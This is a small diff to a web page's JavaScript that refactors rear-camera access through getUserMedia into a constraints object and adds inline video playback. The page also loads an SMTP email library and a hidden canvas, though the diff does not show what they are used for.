@@ -36,7 +36,7 @@
 </head>
 
 <body>
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
 
     <script src="https://smtpjs.com/v3/smtp.js">
@@ -109,16 +109,17 @@
         // Grab elements, create settings, etc.
         var video = document.getElementById('video');
 
+        var constraints = {
+            video: {
+                facingMode: "environment"
+            },
+            audio: false
+        };
         // Get access to the camera!
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: "environment"
-                },
-
-            }).then(function(stream) {
+            navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
                 video.srcObject = stream;
-                video.play();
+                // video.play();
             });
         }
     </script>
